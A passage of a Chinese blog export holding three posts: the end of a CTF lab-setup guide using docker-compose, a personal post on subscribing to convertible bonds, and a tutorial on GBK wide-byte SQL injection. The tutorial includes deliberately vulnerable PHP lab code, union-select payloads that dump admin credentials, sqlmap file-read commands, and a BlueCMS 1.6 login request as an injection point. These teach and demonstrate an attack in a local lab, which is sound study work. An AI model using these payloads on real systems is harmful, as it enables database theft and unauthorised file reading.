<h2 id="3-安装-docker-compose"><a href="#3-安装-docker-compose" class="headerlink" title="3. 安装 docker-compose"></a>3. 安装 docker-compose</h2><blockquote>
<p>docker-compose 是用于定义和运行多容器 Docker 应用程序的工具。通过 Compose，可以使用 YML 文件来配置应用程序需要的所有服务。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。</p>
</blockquote>
<ul>
<li>从 Github 安装<br> 使用 curl 下载 1.27.4版本，如果需要安装其他版本，修改版本号即可。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -L &quot;https:&#x2F;&#x2F;github.com&#x2F;docker&#x2F;compose&#x2F;releases&#x2F;download&#x2F;1.27.4&#x2F;docker-compose-$(uname -s)-$(uname -m)&quot; -o &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose</span><br></pre></td></tr></table></figure></li>
<li>增加执行权限<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose</span><br></pre></td></tr></table></figure></li>
<li>创建软链接<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose &#x2F;usr&#x2F;bin&#x2F;docker-compose</span><br></pre></td></tr></table></figure></li>
<li>测试是否安装成功<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sudo docker-compose --version</span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="4-配置具体题目环境-docker-compose-yml"><a href="#4-配置具体题目环境-docker-compose-yml" class="headerlink" title="4. 配置具体题目环境 docker-compose.yml"></a>4. 配置具体题目环境 docker-compose.yml</h2><ul>
<li>在 home/用户 下 创建一个测试目录 compose<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir compose</span><br></pre></td></tr></table></figure></li>
<li>配置 docker-compose.yml，若不存在此文件，直接新建<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># yaml 配置:SQL 注入-1</span><br><span class="line">version: &#39;3.2&#39;</span><br><span class="line">services:</span><br><span class="line">  web:</span><br><span class="line">    image: registry.cn-hangzhou.aliyuncs.com&#x2F;n1book&#x2F;web-information-backk:latest</span><br><span class="line">    ports:</span><br><span class="line">        - 80:80</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="5-启动方式"><a href="#5-启动方式" class="headerlink" title="5. 启动方式"></a>5. 启动方式</h2><p>在当前题目配置 docker-compose.yml 所在文件夹，执行以下命令</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">docker-compose</span> <span class="string">up</span> <span class="string">-d</span></span><br><span class="line"></span><br><span class="line"><span class="string">or</span> </span><br><span class="line"></span><br><span class="line"><span class="string">sudo</span> <span class="string">docker-compose</span> <span class="string">up</span> <span class="string">-d</span></span><br></pre></td></tr></table></figure>
<p>可以对每个题目都创建一个文件夹，里面存放这个题目的 docker-compose.yml，这样需要启动某个题目环境的时候直接进它的目录执行启动指令即可。</p>
<p>停止</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">sudo</span> <span class="string">docker-compose</span> <span class="string">down</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络安全</category>
        <category>CTF</category>
        <category>《从0到1：CTFer成长之路》</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>搭建环境</tag>
      </tags>
  </entry>
  <entry>
    <title>可转债打新介绍</title>
    <url>/%E5%8F%AF%E8%BD%AC%E5%80%BA%E6%89%93%E6%96%B0%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p>股市里可转债打新的介绍</p>
<p>本文章不作任何投资建议，请自行承担投资风险。</p>
<span id="more"></span>

<p>先贴几张新债的历史上市表现<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/stock/%E5%8F%AF%E8%BD%AC%E5%80%BA%E8%BF%91%E6%9C%9F%E6%83%85%E5%86%B5.jpg"></p>
<!-- ![](https://cdn.jsdelivr.net/gh/cs-cshi/image-host/stock/可转债近期情况2.jpg) -->
<p><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/stock/%E5%8F%AF%E8%BD%AC%E5%80%BA%E8%BF%91%E6%9C%9F%E6%83%85%E5%86%B53.jpg"><br>虽说可转债打新常被说成是股市里捡钱的方式，但实际上还是有亏损的情况存在。所以不要抱着捡钱的方式入场，所有消息面、技术面、基本面都已体现在市场上，保持着尊敬市场、敬畏市场的心。</p>
<p>我几个账户一起打新，一年下来平均每个账户收益2000左右。</p>
<p>下面介绍一下可转债打新：</p>
<ol>
<li>股市开户。可转债打新是场内交易，交易时间、交易方式跟股票一样。</li>
<li>新债申购。<ul>
<li>申购时间：T-1日16:00至T日15:00。T指的的申购日当天。</li>
<li>申购数量：顶格收购1万张，这样可以提高中签率。一般申购两三个交易日后券商会通知是否中签。</li>
</ul>
</li>
<li>中签交款。中签后券商会短信提醒交款。交款方式有两种，一种直接手动交款，一种直接往账户留1000，会自动扣款。我比较懒一般都是账户里留1000块就不管了。</li>
<li>上市交易。中签后一般一个月左右会上市交易，具体隔多久得看通知，交易前一天会券商会发短信提醒。</li>
<li>何时卖出。我一般觉得有赚就行，所以都是直接无脑卖的，除非是直接封盘至14：57，这样我会第二天卖，拿点利润去博博更高的涨幅。</li>
</ol>
]]></content>
      <categories>
        <category>投资理财</category>
        <category>股票</category>
      </categories>
      <tags>
        <tag>股票</tag>
      </tags>
  </entry>
  <entry>
    <title>宽字节注入深度讲解</title>
    <url>/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%B7%B1%E5%BA%A6%E8%AE%B2%E8%A7%A3/</url>
    <content><![CDATA[<p>SQL 宽字节注入深度讲解，包含 SQL 注入常见流程、SQL 宽字节注入以及防护</p>
<span id="more"></span>

<h2 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. 基本概念</h2><p>  宽字节是相对于ascII这样单字节而言的；像 GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，实际上只有两字节</p>
<p>  GBK 是一种多字符的编码，通常来说，一个 gbk 编码汉字，占用2个字节。一个 utf-8 编码的汉字，占用3个字节</p>
<p>  转义函数：为了过滤用户输入的一些数据，对特殊的字符加上反斜杠“\”进行转义；Mysql中转义的函数addslashes，mysql_real_escape_string，mysql_escape_string 等，还有一种是配置magic_quote_gpc，不过 PHP 高版本已经移除此功能。</p>
<h2 id="2-SQL的执行过程"><a href="#2-SQL的执行过程" class="headerlink" title="2. SQL的执行过程"></a>2. SQL的执行过程</h2><ol>
<li><p>以 php 客户端为例，使用者输入数据后，会通过php的默认编码生成sql语句发送给服务器。在php没有开启default_charset编码时，php的默认编码为空。<br><img src="https://image.3001.net/images/20180316/15211806792467.png!small" alt="1"></p>
<p>此时 php 会根据数据库中的编码自动来确定使用那种编码，可以使用 &lt;?php $m=”字”; echo strlen($m); 来进行判断，如果输出的值是3说明是utf-8编码；如果输出的值是 2 说明是 gbk 编码。</p>
</li>
<li><p>服务器接收到请求后会把客户端编码的字符串转换成连接层编码字符串（具体流程是先使用系统变量 character_set_client 对 SQL 语句进行解码后，然后使用 系统变量 character_set_connection 对解码后的十六进制进行编码）。<br><img src="https://image.3001.net/images/20180316/15211808532895.png!small" alt="2"></p>
</li>
<li><p>进行内部操作前，将请求按照如下规则转化成内部操作字符集，如下：</p>
</li>
</ol>
<ul>
<li>使用字段 CHARACTER SET 设定值；</li>
<li>若上述值不存在，使用对应数据表的DEFAULT CHARACTER SET设定值；<br><img src="https://image.3001.net/images/20180316/15211808617493.png!small" alt="3"></li>
<li>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；</li>
<li>若上述值不存在，则使用character_set_server设定值。</li>
</ul>
<ol start="4">
<li>执行完 SQL 语句之后，将执行结果按照 character_set_results 编码进行输出。</li>
</ol>
<h2 id="3-宽字节注入"><a href="#3-宽字节注入" class="headerlink" title="3. 宽字节注入"></a>3. 宽字节注入</h2><p>宽字节注入指的是 mysql 数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入单引号时，mysql会调用转义函数，将单引号变为&#39;，其中\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是’運’，从而使单引号闭合（逃逸），进行注入攻击。<br><img src="https://image.3001.net/images/20180316/15211808764388.png!small" alt="4"></p>
<p>宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码，然后服务器会根据character_set_connection把请求进行转码，从character_set_client转成character_set_connection，然后更新到数据库的时候，再转化成字段所对应的编码</p>
<p>以下是数据的变化过程:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%df%27&#x3D;&#x3D;&#x3D;&gt;(addslashes)&#x3D;&#x3D;&#x3D;&#x3D;&gt;%df%5c%27&#x3D;&#x3D;&#x3D;&#x3D;&gt;(GBK)&#x3D;&#x3D;&#x3D;&#x3D;&gt;運’</span><br><span class="line">​</span><br><span class="line">用户输入&#x3D;&#x3D;&gt;过滤函数&#x3D;&#x3D;&gt;代码层的$sql&#x3D;&#x3D;&gt;mysql处理请求&#x3D;&#x3D;&gt;mysql中的sql</span><br></pre></td></tr></table></figure>

<h2 id="4-环境搭建及分析"><a href="#4-环境搭建及分析" class="headerlink" title="4. 环境搭建及分析"></a>4. 环境搭建及分析</h2><h3 id="4-1-实验1"><a href="#4-1-实验1" class="headerlink" title="4.1 实验1"></a>4.1 实验1</h3><p>为了方便演示该注入的过程，搭建一下环境<br>链接：<a href="https://pan.baidu.com/s/1cMFtCpbbaocMjaWJx7YLcQ">https://pan.baidu.com/s/1cMFtCpbbaocMjaWJx7YLcQ</a> 密码：ykve<br>数据库名为test，数据库的编码全部为gdk<br><img src="https://image.3001.net/images/20180316/152118090725.png!small" alt="5"></p>
<p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Team:红日安全团队</span></span><br><span class="line"><span class="comment">团队成员：CPR</span></span><br><span class="line"><span class="comment">Title：宽字节注入</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//连接数据库部分，注意使用了gbk编码</span></span><br><span class="line"><span class="variable">$conn</span> = mysql_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;bad!&#x27;</span>);</span><br><span class="line">mysql_query(<span class="string">&quot;SET NAMES &#x27;gbk&#x27;&quot;</span>);</span><br><span class="line">mysql_select_db(<span class="string">&#x27;test&#x27;</span>, <span class="variable">$conn</span>) <span class="keyword">OR</span> emMsg(<span class="string">&quot;连接数据库失败，未找到您填写的数据库&quot;</span>);</span><br><span class="line"><span class="comment">//执行sql语句</span></span><br><span class="line"><span class="variable">$id</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) ? addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) : <span class="number">1</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM news WHERE tid=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>, <span class="variable">$conn</span>) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;执行的sql语句是:&quot;</span>.<span class="variable">$sql</span>.<span class="string">&quot;&lt;br&gt;&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;gbk&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;宽字节测试&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;test.php&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">   &lt;b&gt;请输入值：&lt;/b&gt; &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>, MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;<span class="subst">&#123;$row[&#x27;title&#x27;]&#125;</span>&lt;/h2&gt;&lt;p&gt;<span class="subst">&#123;$row[&#x27;content&#x27;]&#125;</span>&lt;p&gt;\n&quot;</span>;</span><br><span class="line">mysql_free_result(<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>加上 <code>echo &quot;&lt;br&gt;&quot;.&quot;执行的sql语句是:&quot;.$sql.&quot;&lt;br&gt;&quot;</code> 这句话，可以清楚的查看sql语句的变化过程。</p>
<p>sql 语句是 <code>SELECT * FROM news WHERE tid=&#39;&#123;$id&#125;</code> 根据 id 从数据库表中获取信息。</p>
<h4 id="4-1-1-确定注入点"><a href="#4-1-1-确定注入点" class="headerlink" title="4.1.1 确定注入点"></a>4.1.1 确定注入点</h4><p><img src="https://image.3001.net/images/20180316/15211809709556.png!small" alt="6"><br>单纯加上单引号没有报错，说明addslashes函数发挥了作用，将’ –&gt; &#39;，这样就不会存在注入了。</p>
<p><img src="https://image.3001.net/images/20180316/1521180980159.png!small" alt="7"><br>此时，在单引号前面加上前面讲的%df,是**mysql认为%df**是一个汉字，这样’就可以逃逸出来，使tid = ‘1’闭合。</p>
<p>这时候，按说是可以构造查询语句了，可是为什么还在报错呢，因为tid=’1’后面的’没有闭合，需要使用注释符号(– ‘或#)将这个多余的’注释掉，这样就可以构造注入语句了。<br><img src="https://image.3001.net/images/20180316/15211809868608.png!small" alt="8"></p>
<p>下面就可以按照手动注入的思路进行数据的获取了。</p>
<h4 id="4-1-2-确定表的字段数"><a href="#4-1-2-确定表的字段数" class="headerlink" title="4.1.2 确定表的字段数"></a>4.1.2 确定表的字段数</h4><p>由于接下来要采用union探测内容，而union的规则是必须要求列数相同才能正常展示，因此必须要探测列数，保证构造的注入查询结果与元查询结果列数与数据类型相同； ‘order by 1’代表按第一列升序排序，若数字代表的列不存在，则会报错，由此可以探测出有多少列。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?id&#x3D;1 %df&#39; order by 4 -- &#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://image.3001.net/images/20180316/15211809937810.png!small" alt="8"></p>
<p>可知一共有3个字段</p>
<h4 id="4-1-3-确定字段的显示位"><a href="#4-1-3-确定字段的显示位" class="headerlink" title="4.1.3 确定字段的显示位"></a>4.1.3 确定字段的显示位</h4><p>显示位：表中数据第几位的字段可以 显示，因为并不是所有的查询结果都 会展示在页面中，因此需要探测页面 中展示的查询结果是哪一列的结果; ‘union select 1,2,3 – ‘ 通过显示的数字可以判断那些字段可以显示出来。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?id&#x3D;-1 %df&#39; union select 1,2,3 -- &#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://image.3001.net/images/20180316/15211810014295.png!small" alt="9"></p>
<p>id的值要用-1或者该表中没有用过的id值，否则测试值会被覆盖。</p>
<h4 id="4-1-4-获取当前数据库信息"><a href="#4-1-4-获取当前数据库信息" class="headerlink" title="4.1.4 获取当前数据库信息"></a>4.1.4 获取当前数据库信息</h4><h5 id="1-获取当前数据库名"><a href="#1-获取当前数据库名" class="headerlink" title="1. 获取当前数据库名"></a>1. 获取当前数据库名</h5><p>现在只有两个字段可以显示信息，显然在后面的查询数据中，两个字段是不够用，可以使用：</p>
<ul>
<li>group_concat()函数（可以把查询出来的多行数据连接起来在一个字段中显示） </li>
<li>database()函数：查看当前数据库名称 </li>
<li>version()函数：查看数据库版本信息 </li>
<li>user():返回当前数据库连接使用的用户 </li>
<li>char():将十进制ASCII码转化成字符<br><img src="https://image.3001.net/images/20180316/15211810104586.png!small" alt="10"></li>
</ul>
<p>当前数据库名为’test’。</p>
<h5 id="2-获取test数据库中的表信息"><a href="#2-获取test数据库中的表信息" class="headerlink" title="2. 获取test数据库中的表信息"></a>2. 获取test数据库中的表信息</h5><p>Mysql有一个系统的数据库 information_schema,里面保存着所有数据库的相关信息，使用该表完成注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?id&#x3D;-1 %df&#39; union select 1,2,group_concat(table_name)  </span><br><span class="line">from information_schema.tables where table_schema&#x3D;0x74657374 -- &#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://image.3001.net/images/20180316/15211810181970.png!small" alt="11"></p>
<p>由于存在addslashes转义了单引号，如果在table_schema中继续使用单引号包裹数据库名字，就会报错，这时候需要使用十六进制编码来避免这个问题。</p>
<h5 id="3-获取admin表的字段"><a href="#3-获取admin表的字段" class="headerlink" title="3. 获取admin表的字段"></a>3. 获取admin表的字段</h5><p>column_name表示获取字段名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?id&#x3D;-1 %df&#39; union select 1,2,group_concat(column_name)  </span><br><span class="line">from information_schema.columns where table_name&#x3D;0x61646d696e -- &#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://image.3001.net/images/20180316/15211810262911.png!small" alt="12"></p>
<p>table_name 需要使用十六进制编码</p>
<h5 id="4-获取-admin-表的数据"><a href="#4-获取-admin-表的数据" class="headerlink" title="4. 获取 admin 表的数据"></a>4. 获取 admin 表的数据</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?id&#x3D;-1 %df&#39; union select 1,2,concat(name,char(58),pass) from admin -- &#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://image.3001.net/images/20180316/15211810344824.png!small" alt="13"><br>数据获取到了，可以更深入一下，比如进行文件的读取，提权等操作。</p>
<h5 id="5-获取当前用户信息"><a href="#5-获取当前用户信息" class="headerlink" title="5. 获取当前用户信息"></a>5. 获取当前用户信息</h5><p>此次会用到工具SQLMAP，sqlmap是一个SQL注入工具。此一具在业界称为神器。sqlmap是用python语言编写，如果想对工具详细了解，请到官网了解。</p>
<p>下载和使用</p>
<blockquote>
<ul>
<li><a href="http://sqlmap.org/">http://sqlmap.org/</a></li>
<li><a href="http://blog.csdn.net/whatday/article/details/54766536">http://blog.csdn.net/whatday/article/details/54766536</a></li>
</ul>
</blockquote>
<p>本实验用到sqlmap，以下是用sqlmap工具操作。使用sqlmap工具第一步猜用户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;127.0.0.1/index.php?id=1 %df&#x27;&quot; --current-user</span><br></pre></td></tr></table></figure>
<p><img src="https://image.3001.net/images/20180316/15211810431922.png!small" alt="14"></p>
<p>看到是root用户，可以更方便的搞事情了。</p>
<h5 id="6-读服务器中的文件"><a href="#6-读服务器中的文件" class="headerlink" title="6. 读服务器中的文件"></a>6. 读服务器中的文件</h5><p>sqlmap 中–file-read参数，可以读取服务器端任意文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;127.0.0.1/index.php?id=1 %df&#x27;&quot; --file-read=&quot;./index.php&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://image.3001.net/images/20180316/15211810501173.png!small" alt="15"></p>
<p>已经将文件保存到了本地/root/.sqlmap/output/127.0.0.1/files文件夹下</p>
<p>正常思路，接下来可以进行提权了，由于该环境是搭建在windows下的，使用–file-write参数进行写文件的操作不能执行，这里就不做演示了。</p>
<h3 id="4-2-实验2"><a href="#4-2-实验2" class="headerlink" title="4.2 实验2"></a>4.2 实验2</h3><p>为了方便演示该注入的过程，搭建一下环境<br>链接：<a href="https://pan.baidu.com/s/1WC4D-3o-A7uYAi8w_yQ7sA">https://pan.baidu.com/s/1WC4D-3o-A7uYAi8w_yQ7sA</a> 密码：sbwy<br>数据库名为test，数据库的编码全部为gdk<br><img src="https://image.3001.net/images/20180316/15211810576597.png!small" alt="16"></p>
<p>将 index.php 放到 phpStudy 的 WWW 目录下，将 test.sql 文件导入到数据库中即可</p>
<p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Team:红日安全团队</span></span><br><span class="line"><span class="comment">团队成员：CPR</span></span><br><span class="line"><span class="comment">Title：宽字节注入</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//连接数据库部分，注意使用了gbk编码</span></span><br><span class="line"><span class="variable">$conn</span> = mysql_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;bad!&#x27;</span>);</span><br><span class="line">mysql_query(<span class="string">&quot;SET NAMES &#x27;gbk&#x27;&quot;</span>);</span><br><span class="line">mysql_select_db(<span class="string">&#x27;test&#x27;</span>, <span class="variable">$conn</span>) <span class="keyword">OR</span> emMsg(<span class="string">&quot;连接数据库失败，未找到您填写的数据库&quot;</span>);</span><br><span class="line"><span class="comment">//执行sql语句</span></span><br><span class="line">mysql_query(<span class="string">&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;</span>, <span class="variable">$conn</span>); </span><br><span class="line"><span class="variable">$id</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) ? addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) : <span class="number">1</span>;</span><br><span class="line"><span class="variable">$id</span> = iconv(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;gbk&#x27;</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM news WHERE tid=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>, <span class="variable">$conn</span>) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;sql:&quot;</span>.<span class="variable">$sql</span>.<span class="string">&quot;&lt;br&gt;&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;gbk&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;gbk change utf-<span class="number">8</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>, MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;<span class="subst">&#123;$row[&#x27;title&#x27;]&#125;</span>&lt;/h2&gt;&lt;p&gt;<span class="subst">&#123;$row[&#x27;content&#x27;]&#125;</span>&lt;p&gt;\n&quot;</span>;</span><br><span class="line">mysql_free_result(<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>同样也使用了 addslashes转义，然后使用iconv进行转码，由utf-8 –&gt;gbk</p>
<p>为了避免宽字节注入，很多人使用iconv函数（能够完成各种字符集间的转换$text=iconv(“UTF-8”,”GBK”,$text);），其实这样做是有很大风险的，仍旧可以造成宽字节注入。</p>
<p><strong>可以使用逆向思维，先找一个gbk的汉字錦,錦的utf-8编码是0xe98ca6，它的gbk编码是0xe55c,是不是已经看出来了，当传入的值是錦’，’通过addslashes转义为&#39;(%5c%27),錦通过icov转换为%e5%5c，终止变为了%e5%5c%5c%27,不难看出%5c%5c正好把反斜杠转义，使单引号逃逸，造成注入。</strong></p>
<h4 id="4-2-1-注入点"><a href="#4-2-1-注入点" class="headerlink" title="4.2.1 注入点"></a>4.2.1 注入点</h4><p>按照实验1的思路，可以执行宽字节注入<br><img src="https://image.3001.net/images/20180316/15211810954085.png!small" alt="16"><br>出现报错信息，说明存在宽字节注入。</p>
<p><img src="https://image.3001.net/images/20180316/15211811103257.png!small" alt="17"><br>%5c%5c正好把反斜杠转义，使单引号逃逸</p>
<p><img src="https://image.3001.net/images/20180316/15211811265121.png!small" alt="18"><br>获取到数据信息（这里的sql注入方法和实验1一样，读者可以自己尝试练习）</p>
<h3 id="4-3-实验3"><a href="#4-3-实验3" class="headerlink" title="4.3 实验3"></a>4.3 实验3</h3><p>bluecms 1.6 版本存在宽字节注入，环境源码：</p>
<p>链接：<a href="https://pan.baidu.com/s/11PQqPdopA9bkLBY9gYrpqA">https://pan.baidu.com/s/11PQqPdopA9bkLBY9gYrpqA</a> 密码：ek6o</p>
<p>漏洞复现</p>
<p>该cms的宽字节注入漏洞存在于<a href="http://127.0.0.1/bluecmsv1.6/uploads/admin/index.php.%E6%AD%A4%E5%9C%B0%E5%9D%80%E6%98%AF%E6%88%91%E4%BB%AC%E7%9A%84%E5%AE%89%E8%A3%85%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%98%AF%E5%9C%A8%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%EF%BC%8C%E9%9C%80%E8%A6%81%E6%A0%B9%E6%8D%AE%E4%BD%A0%E7%9A%84%E6%9C%AC%E5%9C%B0%E5%9C%B0%E5%9D%80%E5%92%8C%E8%B7%AF%E5%BE%84%E6%9D%A5%E8%BF%9B%E8%A1%8C%E5%88%A4%E6%96%AD%E3%80%82">http://127.0.0.1/bluecmsv1.6/uploads/admin/index.php.此地址是我们的安装地址，如果是在本地搭建，需要根据你的本地地址和路径来进行判断。</a></p>
<p>为了更好演示效果，我们进行如下安装。首先根据上面提示的下载地址进行下载源码。</p>
<p>将整个bluecms文件放到phpStudy的WWW目录下，浏览器访问url/bluecms/uploads/install 根据提示进行安装。</p>
<p><img src="https://image.3001.net/images/20180316/15211811425693.png!small" alt="19"><br>数据库参数配置</p>
<p>访问<a href="http://127.0.0.1/bluecmsv1.6/uploads/admin/login.php?act=login">http://127.0.0.1/bluecmsv1.6/uploads/admin/login.php?act=login</a> 进入存在注入的页面。</p>
<p>在管理员界面输入登录信息：<br><img src="https://image.3001.net/images/20180316/15211811512315.png!small" alt="20"></p>
<p>使用burp suit 进行抓包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;bluecmsv1.6&#x2F;uploads&#x2F;admin&#x2F;login.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko&#x2F;20100101 Firefox&#x2F;49.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;127.0.0.1&#x2F;bluecmsv1.6&#x2F;uploads&#x2F;admin&#x2F;login.php?act&#x3D;login</span><br><span class="line">Cookie: PHPSESSID&#x3D;om57mhu92141dqc3hn8ajce8q1</span><br><span class="line">DNT: 1</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 63</span><br><span class="line">​</span><br><span class="line">admin_name&#x3D;admin&amp;admin_pwd&#x3D;123&amp;submit&#x3D;%B5%C7%C2%BC&amp;act&#x3D;do_login</span><br></pre></td></tr></table></figure>
<p>admin_name就是注入点，可以实现万能密码登录</p>
<p>构造payload</p>
